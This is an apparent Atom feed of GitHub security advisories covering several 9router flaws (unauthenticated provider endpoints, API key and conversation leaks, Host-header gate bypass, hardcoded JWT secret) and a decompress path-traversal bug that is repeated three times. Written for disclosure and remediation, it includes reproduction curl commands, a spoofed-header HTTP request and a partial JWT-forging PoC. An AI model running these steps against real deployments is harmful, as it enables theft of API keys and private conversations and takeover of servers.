<li>Import malicious data: <code>curl -X POST -b auth_token=&lt;jwt&gt; -H "Content-Type: application/json" -d '&lt;modified-db&gt;' http://localhost:20128/api/settings/database</code></li>
<li>All settings, passwords, API keys are now replaced with attacker-controlled values</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Confidentiality:</strong> Complete exposure of all stored secrets (API keys, OAuth tokens, OIDC client secrets)</li>
<li><strong>Integrity:</strong> Complete database replacement with attacker-controlled data</li>
<li><strong>Availability:</strong> Database wipe is possible by importing an empty database</li>
<li><strong>Scope Changed:</strong> Importing new settings affects all users and downstream services</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<ol>
<li>Require re-authentication for database export/import (not just an existing session)</li>
<li>Mask/redact API keys in export (or require explicit opt-in for key export)</li>
<li>Add confirmation step for import (require current password verification)</li>
<li>Implement database backup before import</li>
<li>Log all export/import operations with audit trail</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-qvfm-67h2-2qfx">https://github.com/decolua/9router/security/advisories/GHSA-qvfm-67h2-2qfx</a></li>
<li><a href="https://github.com/advisories/GHSA-qvfm-67h2-2qfx">https://github.com/advisories/GHSA-qvfm-67h2-2qfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvfm-67h2-2qfx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-06T21:37:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9router has unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats]]></title>
        <id>https://github.com/advisories/GHSA-vjc7-jrh9-9j86</id>
        <link href="https://github.com/advisories/GHSA-vjc7-jrh9-9j86"/>
        <updated>2026-07-06T21:22:11.000Z</updated>
        <content type="html"><![CDATA[<hr>
<h2 id="title-unauthenticated-crud-on-apiproviders-and-full-api-key-leak-via-apiusagestats-product-9router-version--0441-severity-critical-cve_request-true">title: Unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats
product: 9Router
version: &lt;= 0.4.41
severity: critical
cve_request: true</h2>
<h2 id="summary">Summary</h2>
<p>Multiple critical API security vulnerabilities were discovered in 9Router's Next.js dashboard. The <code>/api/providers</code> endpoints lack authentication entirely, allowing anyone to create, read, update, and delete provider connections. Additionally, <code>/api/usage/stats</code> exposes full plaintext API keys, and <code>/api/usage/request-logs</code> + <code>/api/usage/request-details</code> expose all users' request history and full conversation contents (including system prompts, user messages, assistant responses) without authentication.</p>
<h2 id="affected-endpoints">Affected Endpoints</h2>
<table>
<thead>
<tr>
<th>Endpoint</th>
<th>Method</th>
<th>Issue</th>
</tr>
</thead>
<tbody><tr>
<td><code>/api/providers</code></td>
<td>GET</td>
<td>Lists all provider connections with partial credentials, OAuth tokens, account IDs</td>
</tr>
<tr>
<td><code>/api/providers/:id</code></td>
<td>GET</td>
<td>Read any single provider detail (IDOR)</td>
</tr>
<tr>
<td><code>/api/providers</code></td>
<td>POST</td>
<td>Create arbitrary provider connections with attacker-controlled API keys</td>
</tr>
<tr>
<td><code>/api/providers/:id</code></td>
<td>PUT</td>
<td>Modify any existing provider connection</td>
</tr>
<tr>
<td><code>/api/providers/:id</code></td>
<td>DELETE</td>
<td>Delete any provider connection</td>
</tr>
<tr>
<td><code>/api/usage/stats</code></td>
<td>GET</td>
<td>Exposes full plaintext API keys, per-account usage breakdown, cost data</td>
</tr>
<tr>
<td><code>/api/usage/request-logs</code></td>
<td>GET</td>
<td>Exposes all users' request logs (model, tokens, cost, timestamp, provider)</td>
</tr>
<tr>
<td><code>/api/usage/request-details/:id</code></td>
<td>GET</td>
<td>Exposes full conversation turns including system prompts, user messages, assistant responses</td>
</tr>
<tr>
<td><code>/api/version</code></td>
<td>GET</td>
<td>Exposes current version info</td>
</tr>
<tr>
<td><code>/api/models</code></td>
<td>GET</td>
<td>Exposes full model routing catalog</td>
</tr>
<tr>
<td><code>/api/v1/models</code></td>
<td>GET</td>
<td>Exposes model list</td>
</tr>
</tbody></table>
<h2 id="impact">Impact</h2>
<h3 id="critical-provider-crud-without-authentication">Critical: Provider CRUD without authentication</h3>
<p>An attacker can:</p>
<ol>
<li><strong>Add a malicious provider</strong> — inject a provider that proxies through their server, capturing all prompts, responses, and API keys routed through 9Router</li>
<li><strong>Modify existing providers</strong> — replace API keys with attacker-controlled ones, redirect traffic</li>
<li><strong>Delete all providers</strong> — cause complete denial of service</li>
<li><strong>Read all provider configurations</strong> — harvest partial credentials, GitHub Copilot OAuth tokens, Cloudflare account IDs, email addresses</li>
</ol>
<h3 id="critical-full-api-key-leak-via-apiusagestats">Critical: Full API key leak via /api/usage/stats</h3>
<p>The endpoint returns complete API key strings (e.g., <code>sk-...</code>) in plaintext alongside usage data per key, enabling unauthorized use of connected AI provider accounts.</p>
<h3 id="critical-conversation-history-leak">Critical: Conversation history leak</h3>
<p><code>/api/usage/request-details</code> returns the full conversation history of other users' AI sessions, including system prompts, user messages, assistant responses, tool calls, and reasoning traces.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<h3 id="1-unauthenticated-read-of-all-providers">1. Unauthenticated read of all providers</h3>
<pre><code class="language-bash">curl -s https://&lt;host&gt;/api/providers
</code></pre>
<p>Returns all provider connections with email addresses, auth type, account IDs, and partial API key prefixes.</p>
<h3 id="2-create-a-provider-without-authentication">2. Create a provider without authentication</h3>
<pre><code class="language-bash">curl -X POST https://&lt;host&gt;/api/providers \
  -H "Content-Type: application/json" \
  -d '{"provider":"openai","authType":"apikey","name":"rogue","apiKey":"sk-attacker-controlled"}'
</code></pre>
<p>Returns the created connection object with a new UUID and <code>isActive: true</code>.</p>
<h3 id="3-modify-an-existing-provider-without-authentication">3. Modify an existing provider without authentication</h3>
<pre><code class="language-bash">curl -X PUT https://&lt;host&gt;/api/providers/&lt;existing-uuid&gt; \
  -H "Content-Type: application/json" \
  -d '{"name":"modified","apiKey":"sk-attacker-key"}'
</code></pre>
<p>Returns the updated connection object.</p>
<h3 id="4-delete-a-provider-without-authentication">4. Delete a provider without authentication</h3>
<pre><code class="language-bash">curl -X DELETE https://&lt;host&gt;/api/providers/&lt;existing-uuid&gt;
</code></pre>
<p>Returns <code>{"message":"Connection deleted successfully"}</code>.</p>
<h3 id="5-read-full-usage-stats-with-api-keys">5. Read full usage stats with API keys</h3>
<pre><code class="language-bash">curl -s https://&lt;host&gt;/api/usage/stats
</code></pre>
<p>Returns full API key strings, per-account token/cost breakdown, recent requests.</p>
<h3 id="6-read-request-logs">6. Read request logs</h3>
<pre><code class="language-bash">curl -s "https://&lt;host&gt;/api/usage/request-logs?page=1&amp;pageSize=50"
</code></pre>
<p>Returns paginated request logs with timestamps, models, providers, user emails, token counts.</p>
<h3 id="7-read-full-conversation">7. Read full conversation</h3>
<pre><code class="language-bash">curl -s https://&lt;host&gt;/api/usage/request-details/&lt;request-uuid&gt;
</code></pre>
<p>Returns complete conversation turns for that request.</p>
<h3 id="8-read-version-info">8. Read version info</h3>
<pre><code class="language-bash">curl -s https://&lt;host&gt;/api/version
</code></pre>
<p>Returns <code>{"currentVersion":"0.4.19","latestVersion":"0.4.45","hasUpdate":true}</code>.</p>
<h2 id="root-cause">Root Cause</h2>
<p>The Next.js API routes under <code>src/app/api/*</code> lack authentication middleware on several endpoints. Specifically:</p>
<ul>
<li><code>/api/providers/*</code> — No auth check before CRUD operations on provider connections stored in the database</li>
<li><code>/api/usage/stats</code> — No auth check before returning aggregated usage data including full API keys</li>
<li><code>/api/usage/request-logs</code> — No auth check before returning request history</li>
<li><code>/api/usage/request-details/:id</code> — No auth check before returning full conversation contents</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<ol>
<li>Add authentication middleware to all <code>/api/providers/*</code> routes (GET, POST, PUT, DELETE)</li>
<li>Add authentication middleware to all <code>/api/usage/*</code> routes</li>
<li>Never return full API key strings in any API response — return masked keys only</li>
<li>Never return GitHub Copilot tokens or similar OAuth secrets in API responses</li>
<li>Implement proper authorization checks so users can only access their own data</li>
<li>Add rate limiting to public endpoints</li>
</ol>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://github.com/decolua/9router">https://github.com/decolua/9router</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-vjc7-jrh9-9j86">https://github.com/decolua/9router/security/advisories/GHSA-vjc7-jrh9-9j86</a></li>
<li><a href="https://github.com/advisories/GHSA-vjc7-jrh9-9j86">https://github.com/advisories/GHSA-vjc7-jrh9-9j86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjc7-jrh9-9j86</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-06T21:22:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[decompress] Decompress: Archive extraction can create files and links outside of the target directory]]></title>
        <id>https://github.com/advisories/GHSA-mp2f-45pm-3cg9</id>
        <link href="https://github.com/advisories/GHSA-mp2f-45pm-3cg9"/>
        <updated>2026-07-06T20:27:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When extracting an archive to a directory, a crafted archive can read or write files outside that directory. The flaw is in the code that writes the parsed entries, so it affects every format decompress handles: tar, tar.gz, tar.bz2, and zip by default, plus any others added through the plugins option.</p>
<p>A link (hardlink) or symlink entry is created without checking where its target points. A hardlink can be aimed at any file the running process can read; that file then appears inside the output directory and its contents are exposed. A symlink can point outside the output directory and redirect a later write.</p>
<p>The path containment check used a string prefix comparison (<code>realPath.indexOf(outputPath) !== 0</code>). Output <code>/srv/out</code> does not contain <code>/srv/out-old</code>, but the prefix comparison treats it as inside, so an entry can escape into a sibling directory whose name starts with the output directory name.</p>
<p>File modes were applied as <code>mode &amp; ~umask</code>, which does not remove the setuid, setgid, or sticky bits. A crafted entry can create a setuid or setgid file. This matters when extraction runs as root, for example in CI, containers, or install scripts.</p>
<p>Any code that extracts archives from an untrusted or attacker-influenced source is affected. Archives are commonly downloaded before extraction, so this is reachable over the network in many setups.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>@xhmikosr/decompress</code> 10.2.1 and 11.1.3. Link targets are now resolved and checked against the output directory, containment uses <code>path.relative</code>, and setuid, setgid, and sticky bits are removed.</p>
<p>The upstream <code>decompress</code> package is unmaintained, and all versions through its last release (4.2.1) have the same flaws. There is no upstream fix. Migrate to <code>@xhmikosr/decompress</code> 11.1.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Extract only archives you trust. Run extraction as a non-root user so the mode issue cannot create a privileged file. After extracting, reject any symlink or hardlink that points outside the target and any file with unexpected mode bits.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Related prior issue in the upstream project this package forks: CVE-2020-12265 / GHSA-qgfr-5hqp-vrw9</li>
<li>Fix commits and releases:<ul>
<li><a href="https://github.com/XhmikosR/decompress/releases/tag/v10.2.1">https://github.com/XhmikosR/decompress/releases/tag/v10.2.1</a></li>
<li><a href="https://github.com/XhmikosR/decompress/releases/tag/v11.1.3">https://github.com/XhmikosR/decompress/releases/tag/v11.1.3</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/aca5aac">https://github.com/XhmikosR/decompress/commit/aca5aac</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/281cefa">https://github.com/XhmikosR/decompress/commit/281cefa</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/60b5299">https://github.com/XhmikosR/decompress/commit/60b5299</a></li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/XhmikosR/decompress/security/advisories/GHSA-mp2f-45pm-3cg9">https://github.com/XhmikosR/decompress/security/advisories/GHSA-mp2f-45pm-3cg9</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/281cefa">https://github.com/XhmikosR/decompress/commit/281cefa</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/60b5299">https://github.com/XhmikosR/decompress/commit/60b5299</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/aca5aac">https://github.com/XhmikosR/decompress/commit/aca5aac</a></li>
<li><a href="https://github.com/advisories/GHSA-mp2f-45pm-3cg9">https://github.com/advisories/GHSA-mp2f-45pm-3cg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp2f-45pm-3cg9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-06T20:27:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@xhmikosr/decompress] Decompress: Archive extraction can create files and links outside of the target directory]]></title>
        <id>https://github.com/advisories/GHSA-mp2f-45pm-3cg9</id>
        <link href="https://github.com/advisories/GHSA-mp2f-45pm-3cg9"/>
        <updated>2026-07-06T20:27:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When extracting an archive to a directory, a crafted archive can read or write files outside that directory. The flaw is in the code that writes the parsed entries, so it affects every format decompress handles: tar, tar.gz, tar.bz2, and zip by default, plus any others added through the plugins option.</p>
<p>A link (hardlink) or symlink entry is created without checking where its target points. A hardlink can be aimed at any file the running process can read; that file then appears inside the output directory and its contents are exposed. A symlink can point outside the output directory and redirect a later write.</p>
<p>The path containment check used a string prefix comparison (<code>realPath.indexOf(outputPath) !== 0</code>). Output <code>/srv/out</code> does not contain <code>/srv/out-old</code>, but the prefix comparison treats it as inside, so an entry can escape into a sibling directory whose name starts with the output directory name.</p>
<p>File modes were applied as <code>mode &amp; ~umask</code>, which does not remove the setuid, setgid, or sticky bits. A crafted entry can create a setuid or setgid file. This matters when extraction runs as root, for example in CI, containers, or install scripts.</p>
<p>Any code that extracts archives from an untrusted or attacker-influenced source is affected. Archives are commonly downloaded before extraction, so this is reachable over the network in many setups.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>@xhmikosr/decompress</code> 10.2.1 and 11.1.3. Link targets are now resolved and checked against the output directory, containment uses <code>path.relative</code>, and setuid, setgid, and sticky bits are removed.</p>
<p>The upstream <code>decompress</code> package is unmaintained, and all versions through its last release (4.2.1) have the same flaws. There is no upstream fix. Migrate to <code>@xhmikosr/decompress</code> 11.1.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Extract only archives you trust. Run extraction as a non-root user so the mode issue cannot create a privileged file. After extracting, reject any symlink or hardlink that points outside the target and any file with unexpected mode bits.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Related prior issue in the upstream project this package forks: CVE-2020-12265 / GHSA-qgfr-5hqp-vrw9</li>
<li>Fix commits and releases:<ul>
<li><a href="https://github.com/XhmikosR/decompress/releases/tag/v10.2.1">https://github.com/XhmikosR/decompress/releases/tag/v10.2.1</a></li>
<li><a href="https://github.com/XhmikosR/decompress/releases/tag/v11.1.3">https://github.com/XhmikosR/decompress/releases/tag/v11.1.3</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/aca5aac">https://github.com/XhmikosR/decompress/commit/aca5aac</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/281cefa">https://github.com/XhmikosR/decompress/commit/281cefa</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/60b5299">https://github.com/XhmikosR/decompress/commit/60b5299</a></li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/XhmikosR/decompress/security/advisories/GHSA-mp2f-45pm-3cg9">https://github.com/XhmikosR/decompress/security/advisories/GHSA-mp2f-45pm-3cg9</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/281cefa">https://github.com/XhmikosR/decompress/commit/281cefa</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/60b5299">https://github.com/XhmikosR/decompress/commit/60b5299</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/aca5aac">https://github.com/XhmikosR/decompress/commit/aca5aac</a></li>
<li><a href="https://github.com/advisories/GHSA-mp2f-45pm-3cg9">https://github.com/advisories/GHSA-mp2f-45pm-3cg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp2f-45pm-3cg9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-06T20:27:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@xhmikosr/decompress] Decompress: Archive extraction can create files and links outside of the target directory]]></title>
        <id>https://github.com/advisories/GHSA-mp2f-45pm-3cg9</id>
        <link href="https://github.com/advisories/GHSA-mp2f-45pm-3cg9"/>
        <updated>2026-07-06T20:27:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When extracting an archive to a directory, a crafted archive can read or write files outside that directory. The flaw is in the code that writes the parsed entries, so it affects every format decompress handles: tar, tar.gz, tar.bz2, and zip by default, plus any others added through the plugins option.</p>
<p>A link (hardlink) or symlink entry is created without checking where its target points. A hardlink can be aimed at any file the running process can read; that file then appears inside the output directory and its contents are exposed. A symlink can point outside the output directory and redirect a later write.</p>
<p>The path containment check used a string prefix comparison (<code>realPath.indexOf(outputPath) !== 0</code>). Output <code>/srv/out</code> does not contain <code>/srv/out-old</code>, but the prefix comparison treats it as inside, so an entry can escape into a sibling directory whose name starts with the output directory name.</p>
<p>File modes were applied as <code>mode &amp; ~umask</code>, which does not remove the setuid, setgid, or sticky bits. A crafted entry can create a setuid or setgid file. This matters when extraction runs as root, for example in CI, containers, or install scripts.</p>
<p>Any code that extracts archives from an untrusted or attacker-influenced source is affected. Archives are commonly downloaded before extraction, so this is reachable over the network in many setups.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>@xhmikosr/decompress</code> 10.2.1 and 11.1.3. Link targets are now resolved and checked against the output directory, containment uses <code>path.relative</code>, and setuid, setgid, and sticky bits are removed.</p>
<p>The upstream <code>decompress</code> package is unmaintained, and all versions through its last release (4.2.1) have the same flaws. There is no upstream fix. Migrate to <code>@xhmikosr/decompress</code> 11.1.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Extract only archives you trust. Run extraction as a non-root user so the mode issue cannot create a privileged file. After extracting, reject any symlink or hardlink that points outside the target and any file with unexpected mode bits.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Related prior issue in the upstream project this package forks: CVE-2020-12265 / GHSA-qgfr-5hqp-vrw9</li>
<li>Fix commits and releases:<ul>
<li><a href="https://github.com/XhmikosR/decompress/releases/tag/v10.2.1">https://github.com/XhmikosR/decompress/releases/tag/v10.2.1</a></li>
<li><a href="https://github.com/XhmikosR/decompress/releases/tag/v11.1.3">https://github.com/XhmikosR/decompress/releases/tag/v11.1.3</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/aca5aac">https://github.com/XhmikosR/decompress/commit/aca5aac</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/281cefa">https://github.com/XhmikosR/decompress/commit/281cefa</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/60b5299">https://github.com/XhmikosR/decompress/commit/60b5299</a></li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/XhmikosR/decompress/security/advisories/GHSA-mp2f-45pm-3cg9">https://github.com/XhmikosR/decompress/security/advisories/GHSA-mp2f-45pm-3cg9</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/281cefa">https://github.com/XhmikosR/decompress/commit/281cefa</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/60b5299">https://github.com/XhmikosR/decompress/commit/60b5299</a></li>
<li><a href="https://github.com/XhmikosR/decompress/commit/aca5aac">https://github.com/XhmikosR/decompress/commit/aca5aac</a></li>
<li><a href="https://github.com/advisories/GHSA-mp2f-45pm-3cg9">https://github.com/advisories/GHSA-mp2f-45pm-3cg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp2f-45pm-3cg9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-06T20:27:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9router has an Incomplete Fix: Local-Only Access Gate Bypass in 9router via Host Header SpoofING]]></title>
        <id>https://github.com/advisories/GHSA-6g2f-w7g3-77vf</id>
        <link href="https://github.com/advisories/GHSA-6g2f-w7g3-77vf"/>
        <updated>2026-07-06T10:44:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for CVE-2026-46339 (unauthenticated RCE via unprotected MCP plugin routes) introduced a local-only access gate in <code>src/dashboardGuard.js</code> that restricts spawn-capable routes (<code>/api/mcp/*</code>, <code>/api/tunnel/*</code>, <code>/api/cli-tools/*</code>) to loopback requests. The gate determines "local" by inspecting the <code>Host</code> and <code>Origin</code> HTTP headers rather than the TCP source address. When 9router is deployed behind a reverse proxy, tunnel (Cloudflare Tunnel, Tailscale — both natively supported), or is subject to DNS rebinding, these headers are attacker-controlled, allowing the local-only gate to be bypassed.</p>
<p>A second factor (CLI token or JWT cookie) is required by <code>canAccessLocalOnlyRoute()</code>, but the CLI token is a deterministic HMAC of the machine ID (<code>getConsistentMachineId</code>), which is stable and predictable on cloud VMs. If the attacker can obtain or guess the machine ID (e.g., via another information disclosure, or on shared-tenant infrastructure), the full chain to MCP child process stdin injection is reachable.</p>
<p>This is a variant / incomplete fix of CVE-2026-46339 — the same attack surface (remote → MCP child process stdin) remains reachable under specific but realistic deployment configurations.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>isLocalRequest()</code> at <code>src/dashboardGuard.js:93-101</code>:</p>
<pre><code class="language-javascript">function isLocalRequest(request) {
  if (!isLoopbackHostname(request.headers.get("host"))) return false;
  const origin = request.headers.get("origin");
  if (origin) {
    try {
      if (!isLoopbackHostname(new URL(origin).hostname)) return false;
    } catch { return false; }
  }
  return true;
}
</code></pre>
<p>This function trusts <code>Host</code> and <code>Origin</code> headers as proof of local origin. Both are attacker-controlled in any proxied deployment. The <code>LOOPBACK_HOSTS</code> set (<code>localhost</code>, <code>127.0.0.1</code>, <code>::1</code>) is checked against these headers, not against the actual connection source IP.</p>
<h2 id="attack-scenario">Attack Scenario</h2>
<h3 id="scenario-1-cloudflare-tunnel--tailscale-funnel">Scenario 1: Cloudflare Tunnel / Tailscale Funnel</h3>
<p>9router natively supports Cloudflare Tunnel and Tailscale (see <code>LOCAL_ONLY_PATHS</code> entries for <code>/api/tunnel/*</code>). When exposed via tunnel:</p>
<ol>
<li>Attacker sends request to <code>https://&lt;tunnel-domain&gt;/api/mcp/&lt;plugin&gt;/sse</code></li>
<li>Sets <code>Host: localhost:3000</code> and <code>Origin: http://localhost:3000</code></li>
<li><code>isLocalRequest()</code> returns <code>true</code></li>
<li><code>canAccessLocalOnlyRoute()</code> then requires CLI token or (local + JWT)</li>
<li>CLI token is <code>getConsistentMachineId("9r-cli-auth")</code> — a deterministic HMAC of the machine's hardware/OS identifiers</li>
</ol>
<h3 id="scenario-2-dns-rebinding">Scenario 2: DNS Rebinding</h3>
<ol>
<li>Attacker controls <code>evil.com</code> DNS, initially resolving to attacker IP</li>
<li>Victim's browser navigates to <code>evil.com</code> (or via iframe/redirect)</li>
<li>DNS rebinding switches <code>evil.com</code> → <code>127.0.0.1</code></li>
<li>Subsequent fetch to <code>evil.com:3000/api/mcp/&lt;plugin&gt;/message</code> reaches 9router</li>
<li><code>Host</code> header is <code>evil.com:3000</code> — this is <strong>blocked</strong> by the current check (not in LOOPBACK_HOSTS)</li>
<li>However, if the attacker uses <code>localhost:3000</code> as the request host via CORS or service worker tricks, and the browser sends <code>Host: localhost:3000</code>, the gate opens</li>
</ol>
<h3 id="exploitation-when-cli-token-is-obtained">Exploitation (when CLI token is obtained)</h3>
<p>Once past the gate, the attacker can:</p>
<ol>
<li><code>GET /api/mcp/&lt;plugin&gt;/sse</code> — establish SSE session, get <code>sessionId</code></li>
<li><code>POST /api/mcp/&lt;plugin&gt;/message</code> — send arbitrary JSON-RPC to the child process stdin</li>
<li>The child process is one of: <code>npx</code>, <code>node</code>, <code>python</code>, <code>python3</code>, <code>uvx</code>, <code>bunx</code>, <code>bun</code></li>
<li>Depending on the MCP plugin implementation, this can achieve arbitrary code execution on the host</li>
</ol>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Deploy 9router behind a reverse proxy or tunnel</li>
<li>From a remote host, send:</li>
</ol>
<pre><code class="language-http">GET /api/mcp/browser/sse HTTP/1.1
Host: localhost:3000
Origin: http://localhost:3000
x-9r-cli-token: &lt;machine-id-derived-token&gt;
</code></pre>
<ol start="3">
<li>Observe: SSE connection established, <code>endpoint</code> event received with message URL</li>
<li>POST arbitrary JSON-RPC to the message endpoint</li>
</ol>
<h2 id="impact">Impact</h2>
<p>An attacker who can reach a proxied/tunneled 9router instance and obtain the deterministic CLI token can bypass the local-only restriction and interact with MCP child processes (node, python, npx, etc.) via stdin. This achieves the same impact as CVE-2026-46339: remote code execution on the host.</p>
<p>The severity is reduced from CVE-2026-46339's CVSS 10.0 because:</p>
<ul>
<li>Requires proxied/tunneled deployment (not default localhost-only)</li>
<li>Requires obtaining the CLI token (deterministic but not trivially guessable without another primitive)</li>
</ul>
<h2 id="remediation">Remediation</h2>
<ol>
<li><p><strong>Check actual source IP, not headers.</strong> Use <code>request.ip</code>, <code>request.socket.remoteAddress</code>, or a trusted <code>X-Forwarded-For</code> header with known proxy configuration instead of <code>Host</code>/<code>Origin</code> for the local-only gate.</p>
</li>
<li><p><strong>Make CLI token non-deterministic.</strong> Generate a random token on first run and persist it, rather than deriving from machine ID. Machine IDs are often predictable or discoverable on cloud infrastructure.</p>
</li>
<li><p><strong>Bind MCP routes to loopback at the network layer.</strong> If MCP is local-only by design, the server should bind those routes to <code>127.0.0.1</code> only, not rely on middleware header checks.</p>
</li>
</ol>
<p>Credit: @snailsploit</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-6g2f-w7g3-77vf">https://github.com/decolua/9router/security/advisories/GHSA-6g2f-w7g3-77vf</a></li>
<li><a href="https://github.com/decolua/9router/commit/5e1c1261368e06dced1cbc650684561b2c8844db">https://github.com/decolua/9router/commit/5e1c1261368e06dced1cbc650684561b2c8844db</a></li>
<li><a href="https://github.com/decolua/9router/commit/bb86808582067e4fc6f004508a919efb9970d1d5">https://github.com/decolua/9router/commit/bb86808582067e4fc6f004508a919efb9970d1d5</a></li>
<li><a href="https://github.com/advisories/GHSA-6g2f-w7g3-77vf">https://github.com/advisories/GHSA-6g2f-w7g3-77vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g2f-w7g3-77vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T21:13:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9router's Hardcoded Default fallback JWT Secret  Allows Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-jphh-m39h-6gwx</id>
        <link href="https://github.com/advisories/GHSA-jphh-m39h-6gwx"/>
        <updated>2026-07-02T20:56:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>9router uses a publicly known hardcoded string <code>"9router-default-secret-change-me"</code> as the fallback of JWT secret for all Dashboard session JWTs when the <code>JWT_SECRET</code> environment variable is not set. Because this secret is committed in the public repository and unchanged across all releases, any unauthenticated remote attacker can forge a valid <code>auth_token</code> cookie and gain full access to dashboard and api (If JWT_SECRET is not set on server) . This vulnerable affected so many public 9router server</p>
<h3 id="details">Details</h3>
<table>
<thead>
<tr>
<th>Versions</th>
<th>File</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td><code>&gt;= 0.2.21, &lt;= 0.4.30</code></td>
<td><code>src/app/api/auth/login/route.js</code> + <code>src/middleware.js</code></td>
<td>Introduced in commit <code>23cfb19</code></td>
</tr>
<tr>
<td><code>&gt;= 0.4.31, &lt;= 0.4.41</code></td>
<td><code>src/lib/auth/dashboardSession.js</code></td>
<td>Relocated by OIDC refactor <code>c3d91b0</code>, secret unchanged</td>
</tr>
</tbody></table>
<p>Vulnerable Code</p>
<p><strong>v0.2.21 – v0.4.30</strong> — <code>src/app/api/auth/login/route.js</code> and <code>src/middleware.js</code>:</p>
<pre><code class="language-js">const SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || "9router-default-secret-change-me"
);
</code></pre>
<p><strong>v0.4.31 – v0.4.41 (current)</strong> — <code>src/lib/auth/dashboardSession.js</code> (centralized via OIDC refactor, commit <code>c3d91b0</code>):</p>
<pre><code class="language-js">const SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || "9router-default-secret-change-me"
);
</code></pre>
<p>The fallback string was introduced in commit <code>23cfb19</code> (2026-01-09) and has never been removed. The OIDC refactor in <code>c3d91b0</code> only relocated it to a shared module . This vulnerability has existed since 9router first introduced authentication.</p>
<h3 id="poc">PoC</h3>
<p><strong>Step 1.</strong> Craft a JWT signed with the known default secret:</p>
<pre><code class="language-js">import { SignJWT } from "jose";

const SECRET = new TextEncoder().encode("9router-default-secret-change-me");

const token = await new SignJWT({ authenticated: true })
  .setProtectedHeader({ alg: "HS256" })
  .setIssuedAt()
  .setExpirationTime("36y")
  .sign(SECRET);

